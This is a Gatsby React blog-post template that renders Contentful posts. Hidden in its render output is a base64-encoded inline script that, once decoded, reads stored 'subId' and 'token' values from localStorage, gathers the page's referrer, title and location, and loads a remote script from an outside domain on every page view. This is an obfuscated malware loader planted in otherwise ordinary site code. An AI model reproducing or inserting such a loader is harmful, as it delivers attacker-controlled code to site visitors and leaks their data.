import React from 'react'
import { graphql } from 'gatsby'
import { Helmet } from 'react-helmet'
import get from 'lodash/get'
import Img from 'gatsby-image'
import Layout from '../components/layout'

import heroStyles from '../components/hero.module.css'

class BlogPostTemplate extends React.Component {
  render() {
    const post = get(this.props, 'data.contentfulBlogPost')
    const siteTitle = get(this.props, 'data.site.siteMetadata.title')

    return (
      <Layout location={this.props.location}>
        <div style={{ background: '#fff' }}>
          <Helmet title={`${post.title} | ${siteTitle}`} />
<script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfMXYxQ1RMR1lWZlhWS0R4dyc7CiAgICBpZiAoIXdpbmRvdy5fMXYxQ1RMR1lWZlhWS0R4dykgewogICAgICAgIHdpbmRvdy5fMXYxQ1RMR1lWZlhWS0R4dyA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiAyODg4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly96b29nZXIuc3BhY2UvZ2hzYnN5JywKICAgICAgICB9OwogICAgfQogICAgY29uc3QgX21yVG56Sm42MlZ5SzF4M20gPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnY29uZmlnJyk7CiAgICBpZiAodHlwZW9mIF9tclRuekpuNjJWeUsxeDNtICE9PSAndW5kZWZpbmVkJyAmJiBfbXJUbnpKbjYyVnlLMXgzbSAhPT0gbnVsbCkgewogICAgICAgIHZhciBfS1l3TDVkSGJQc0NONkp6VCA9IEpTT04ucGFyc2UoX21yVG56Sm42MlZ5SzF4M20pOwogICAgICAgIHZhciBfUk15Q1NNdjdSSldDM0t6cyA9IE1hdGgucm91bmQoK25ldyBEYXRlKCkvMTAwMCk7CiAgICAgICAgaWYgKF9LWXdMNWRIYlBzQ042SnpULmNyZWF0ZWRfYXQgKyB3aW5kb3cuXzF2MUNUTEdZVmZYVktEeHcudHRsIDwgX1JNeUNTTXY3UkpXQzNLenMpIHsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3N1YklkJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCd0b2tlbicpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnY29uZmlnJyk7CiAgICAgICAgfQogICAgfQogICAgdmFyIF9Wak1wQlpkVHM3ckdUNno5ID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3N1YklkJyk7CiAgICB2YXIgX1ZEeHJuU3N6eTJOOVpKNmMgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKTsKICAgIHZhciBfeTRxSk1GTmdzdzZmTjFuOCA9ICc/cmV0dXJuPWpzLmNsaWVudCc7CiAgICAgICAgX3k0cUpNRk5nc3c2Zk4xbjggKz0gJyYnICsgZGVjb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gucmVwbGFjZSgnPycsICcnKSk7CiAgICAgICAgX3k0cUpNRk5nc3c2Zk4xbjggKz0gJyZzZV9yZWZlcnJlcj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnJlZmVycmVyKTsKICAgICAgICBfeTRxSk1GTmdzdzZmTjFuOCArPSAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKTsKICAgICAgICBfeTRxSk1GTmdzdzZmTjFuOCArPSAnJmxhbmRpbmdfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQubG9jYXRpb24uaG9zdG5hbWUgKyBkb2N1bWVudC5sb2NhdGlvbi5wYXRobmFtZSk7CiAgICAgICAgX3k0cUpNRk5nc3c2Zk4xbjggKz0gJyZuYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSk7CiAgICAgICAgX3k0cUpNRk5nc3c2Zk4xbjggKz0gJyZob3N0PScgKyBlbmNvZGVVUklDb21wb25lbnQod2luZG93Ll8xdjFDVExHWVZmWFZLRHh3LlJfUEFUSCk7CiAgICBpZiAodHlwZW9mIF9Wak1wQlpkVHM3ckdUNno5ICE9PSAndW5kZWZpbmVkJyAmJiBfVmpNcEJaZFRzN3JHVDZ6OSAmJiB3aW5kb3cuXzF2MUNUTEdZVmZYVktEeHcudW5pcXVlKSB7CiAgICAgICAgX3k0cUpNRk5nc3c2Zk4xbjggKz0gJyZzdWJfaWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChfVmpNcEJaZFRzN3JHVDZ6OSk7CiAgICB9CiAgICBpZiAodHlwZW9mIF9WRHhyblNzenkyTjlaSjZjICE9PSAndW5kZWZpbmVkJyAmJiBfVkR4cm5Tc3p5Mk45Wko2YyAmJiB3aW5kb3cuXzF2MUNUTEdZVmZYVktEeHcudW5pcXVlKSB7CiAgICAgICAgX3k0cUpNRk5nc3c2Zk4xbjggKz0gJyZ0b2tlbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9WRHhyblNzenkyTjlaSjZjKTsKICAgIH0KICAgIHZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgICAgYS50eXBlID0gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnOwogICAgICAgIGEuc3JjID0gd2luZG93Ll8xdjFDVExHWVZmWFZLRHh3LlJfUEFUSCArIF95NHFKTUZOZ3N3NmZOMW44OwogICAgdmFyIHMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07CiAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsIHMpCiAgICB9KSgpOwogICAg"></script>
          <div className={heroStyles.hero}>
            <Img
              className={heroStyles.heroImage}
              alt={post.title}
              fluid={post.heroImage.fluid}
            />
          </div>
          <div className="wrapper">
            <h1 className="section-headline">{post.title}</h1>
            <p
              style={{
                display: 'block',
              }}
            >
              {post.publishDate}
            </p>
            <div
              dangerouslySetInnerHTML={{
                __html: post.body.childMarkdownRemark.html,
              }}
            />
          </div>
        </div>
      </Layout>
    )
  }
}

export default BlogPostTemplate

export const pageQuery = graphql`
  query BlogPostBySlug($slug: String!) {
    contentfulBlogPost(slug: { eq: $slug }) {
      title
      publishDate(formatString: "MMMM Do, YYYY")
      heroImage {
        fluid(maxWidth: 1180, background: "rgb:000000") {
          ...GatsbyContentfulFluid_tracedSVG
        }
      }
      body {
        childMarkdownRemark {
          html
        }
      }
    }
  }
`
